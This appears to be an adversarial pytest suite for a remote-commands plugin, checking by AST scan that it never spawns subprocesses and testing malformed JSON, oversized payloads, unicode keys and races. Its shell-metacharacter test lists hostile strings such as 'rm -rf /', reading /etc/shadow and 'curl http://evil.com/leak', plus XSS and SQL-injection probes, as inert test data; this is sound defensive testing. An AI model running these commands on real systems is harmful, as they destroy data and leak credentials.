"""tests.adversarial.test_remotecommands_adversarial
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Adversarial stress, boundary fuzzing, malformed wire packet bursts,
unicode edge cases, concurrency races, and strict zero-subprocess security invariant verification.
"""

from __future__ import annotations

import ast
import asyncio
import json
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import AsyncMock

import pytest

from pengulink.core.events import EventBus, RemoteCommandsReceivedEvent
from pengulink.core.exceptions import RemoteCommandError
from pengulink.network.packet import Packet
from pengulink.plugins.remotecommands import (
    MAX_COMMAND_LENGTH,
    MAX_COMMANDS_PER_DEVICE,
    MAX_KEY_LENGTH,
    MAX_NAME_LENGTH,
    RemoteCommandsPlugin,
    parse_command_list,
)


# =====================================================================
# 1. Security Invariant: Strict AST & Execution Inspection
# =====================================================================

def test_adversarial_001_security_invariant_strict_ast_inspection() -> None:
    """Forensic verification: RemoteCommands plugin must NEVER execute local commands.

    Under NO circumstances may pengulink/plugins/remotecommands.py import or invoke
    subprocess, os.system, os.popen, pty, shlex, or asyncio.create_subprocess_*.
    """
    target = Path("pengulink/plugins/remotecommands.py")
    assert target.is_file(), "Plugin source file must exist"

    code = target.read_text(encoding="utf-8")
    tree = ast.parse(code)

    forbidden_modules = {"subprocess", "os.system", "os.popen", "pty", "shlex"}
    forbidden_calls = {
        "system",
        "popen",
        "spawn",
        "create_subprocess_exec",
        "create_subprocess_shell",
        "eval",
        "exec",
    }

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for n in node.names:
                assert n.name not in forbidden_modules, f"Forbidden import: {n.name}"
        elif isinstance(node, ast.ImportFrom):
            mod = node.module or ""
            assert mod not in forbidden_modules, f"Forbidden from-import: {mod}"
            for n in node.names:
                assert n.name not in forbidden_modules, f"Forbidden from-import symbol: {n.name}"
        elif isinstance(node, ast.Call):
            func = node.func
            if isinstance(func, ast.Name) and func.id in forbidden_calls:
                pytest.fail(f"Forbidden call detected in AST: {func.id}")
            elif isinstance(func, ast.Attribute) and func.attr in forbidden_calls:
                pytest.fail(f"Forbidden attribute call detected in AST: {func.attr}")


# =====================================================================
# 2. Corrupted JSON String Bursts
# =====================================================================

async def test_adversarial_002_corrupted_json_string_bursts() -> None:
    """Deliver a rapid burst of 50 malformed JSON strings in commandList."""
    plugin = RemoteCommandsPlugin()
    send_mock = AsyncMock()

    malformed_strings = [
        "{",
        "}",
        "{{{{{",
        "[",
        "]",
        "null",
        "true",
        "false",
        "12345",
        "\"unclosed string",
        "{'single_quotes': 'not_valid_json'}",
        '{"key": undefined}',
        '{"key": NaN}',
        '{"key": Infinity}',
        '{"key": "\x00\x01\x02"}',
        "",
        "   ",
        "\t\r\n",
        "<!-- XML tag -->",
        "<script>alert(1)</script>",
        "SELECT * FROM commands;",
        '{"nested": {"broken": }}',
    ]

    for idx, broken in enumerate(malformed_strings * 3):
        pkt = Packet(
            type="kdeconnect.runcommand",
            body={"commandList": broken},
        )
        await plugin.handle_packet(pkt, f"device_{idx % 5}", send_mock)
        # Should never raise exception and should default safely to empty dict
        assert plugin.get_commands(f"device_{idx % 5}") == []


# =====================================================================
# 3. Huge Payload Stress & Memory Exhaustion Defense
# =====================================================================

def test_adversarial_003_huge_payload_stress() -> None:
    """Stress parser with huge keys, names, and command payloads."""
    giant_key = "K" * 10_000
    giant_name = "N" * 100_000
    giant_cmd = "C" * 500_000

    body = {
        "commandList": {
            giant_key: {
                "name": giant_name,
                "command": giant_cmd,
            }
        }
    }

    cmds = parse_command_list(body)
    expected_key = giant_key[:MAX_KEY_LENGTH]
    assert expected_key in cmds
    cmd = cmds[expected_key]
    assert len(cmd.key) == MAX_KEY_LENGTH
    assert len(cmd.name) == MAX_NAME_LENGTH
    assert len(cmd.command) == MAX_COMMAND_LENGTH


# =====================================================================
# 4. Dangerous Shell Metacharacters in Keys
# =====================================================================

async def test_adversarial_004_shell_metacharacters_in_keys() -> None:
    """Verify keys with shell injection attempts are treated as inert strings."""
    plugin = RemoteCommandsPlugin()
    send_mock = AsyncMock()

    malicious_keys = [
        "; rm -rf / ;",
        "$(reboot)",
        "`cat /etc/shadow`",
        "| evil_cmd",
        "& echo pwned &",
        "&& curl http://evil.com/leak",
        "|| shutdown -h now",
        "../../../../etc/passwd",
        "\n\r\nDROP TABLE commands;\n",
        "key' OR '1'='1",
    ]

    payload = {
        "commandList": {
            k: {"name": f"Name for {k}", "command": f"cmd {k}"}
            for k in malicious_keys
        }
    }
    pkt = Packet(type="kdeconnect.runcommand", body=payload)
    await plugin.handle_packet(pkt, "adversary_dev", send_mock)

    cmds = plugin.get_commands("adversary_dev")
    assert len(cmds) == len(malicious_keys)

    # Trigger execution: should serialize cleanly without executing locally
    for k in malicious_keys:
        exec_pkt = await plugin.execute_command("adversary_dev", k, send_packet=send_mock)
        assert exec_pkt.body["key"] == k.strip()


# =====================================================================
# 5. Unicode, RTL, CJK, and Emoji Edge Cases
# =====================================================================

def test_adversarial_005_unicode_rtl_cjk_emoji_keys() -> None:
    """Verify non-ASCII, RTL, CJK, zero-width characters, and emojis."""
    complex_commands = {
        "cmd_🚀_lock": {"name": "قفل الشاشة 🔒", "command": "echo 'Arabic RTL'"},
        "cmd_Hebrew_נעילה": {"name": "נעילת מסך", "command": "echo 'Hebrew'"},
        "cmd_CJK_锁屏": {"name": "屏幕锁定", "command": "echo 'CJK'"},
        "cmd_ZWJ_👨‍👩‍👧‍👦": {"name": "Family Emoji", "command": "echo 'ZWJ'"},
        "cmd_combining_e\u0301": {"name": "Accented é", "command": "echo 'combining'"},
    }
    cmds = parse_command_list({"commandList": complex_commands})
    assert len(cmds) == len(complex_commands)
    for k, v in complex_commands.items():
        assert k in cmds
        assert cmds[k].name == v["name"]
        d = cmds[k].to_dict()
        assert d["key"] == k
        assert d["name"] == v["name"]


# =====================================================================
# 6. Unpair Race Condition & Concurrent Ingestion
# =====================================================================

async def test_adversarial_006_unpair_race_condition() -> None:
    """Concurrently fire 50 command executions while simultaneously unpairing."""
    plugin = RemoteCommandsPlugin()
    send_mock = AsyncMock()

    # Ingest commands for target device
    pkt = Packet(
        type="kdeconnect.runcommand",
        body={"commandList": {f"cmd_{i}": {"name": f"Cmd {i}"} for i in range(10)}},
    )
    await plugin.handle_packet(pkt, "target_dev", send_mock)

    async def execute_worker(idx: int) -> None:
        try:
            await plugin.execute_command("target_dev", f"cmd_{idx % 10}", send_packet=send_mock)
        except Exception:
            pass  # Tolerated on unpair

    async def unpair_worker() -> None:
        await asyncio.sleep(0.005)
        plugin.on_device_unpaired("target_dev")

    tasks = [asyncio.create_task(execute_worker(i)) for i in range(50)]
    tasks.append(asyncio.create_task(unpair_worker()))

    await asyncio.gather(*tasks, return_exceptions=True)

    # State must be cleanly evicted
    assert len(plugin.get_commands("target_dev")) == 0


# =====================================================================
# 7. Max Commands Cap Overflow
# =====================================================================

def test_adversarial_007_max_commands_cap_overflow() -> None:
    """Overflow defense: 1,000 commands capped strictly at MAX_COMMANDS_PER_DEVICE (256)."""
    overflow = {
        f"cmd_{i:04d}": {"name": f"Command {i}", "command": f"echo {i}"}
        for i in range(1000)
    }
    cmds = parse_command_list({"commandList": overflow})
    assert len(cmds) == MAX_COMMANDS_PER_DEVICE


# =====================================================================
# 8. Type Confusion in Payload Body
# =====================================================================

def test_adversarial_008_untrusted_keys_in_body_type_confusion() -> None:
    """Verify resilience against unexpected types in candidate object."""
    confusing_candidates = [
        True,
        False,
        0,
        12345,
        3.14159,
        None,
        ["string", 123, None, True],
        {"": {"name": "Empty Key"}},
        {"   ": {"name": "Whitespace Key"}},
        {"valid": None},
        {"valid_empty_dict": {}},
    ]

    for item in confusing_candidates:
        res = parse_command_list({"commandList": item})
        assert isinstance(res, dict)


# =====================================================================
# 9. Corrupted Output Feedback Packets
# =====================================================================

async def test_adversarial_009_corrupted_output_packets() -> None:
    """Verify output feedback packet handles malformed exit codes and missing keys."""
    bus = EventBus()
    events = []
    bus.subscribe_all(lambda ev: events.append(ev))
    plugin = RemoteCommandsPlugin(event_bus=bus)

    corrupt_outputs = [
        {"key": "cmd1", "output": "ok", "exitCode": "not_an_int"},
        {"key": "cmd2", "output": None, "exitCode": None},
        {"key": None, "output": "no_key", "exitCode": -1},
        {"key": "cmd3", "output": "huge " * 1000, "exit_code": 2},
    ]

    for body in corrupt_outputs:
        pkt = Packet(type="kdeconnect.runcommand.output", body=body)
        await plugin.handle_packet(pkt, "dev1", AsyncMock())

    assert len(events) == len(corrupt_outputs)


# =====================================================================
# 10. Multi-Device Concurrent Bursts
# =====================================================================

async def test_adversarial_010_concurrent_multi_device_burst() -> None:
    """Simulate simultaneous packet bursts across 30 different devices."""
    plugin = RemoteCommandsPlugin()
    send_mock = AsyncMock()

    async def device_burst(dev_id: str) -> None:
        pkt = Packet(
            type="kdeconnect.runcommand",
            body={
                "commandList": {
                    f"{dev_id}_cmd": {"name": f"Name {dev_id}", "command": "run"}
                }
            },
        )
        await plugin.handle_packet(pkt, dev_id, send_mock)
        cmds = plugin.get_commands(dev_id)
        assert len(cmds) == 1
        assert cmds[0].key == f"{dev_id}_cmd"

    tasks = [asyncio.create_task(device_burst(f"device_{i}")) for i in range(30)]
    await asyncio.gather(*tasks)

    for i in range(30):
        assert len(plugin.get_commands(f"device_{i}")) == 1
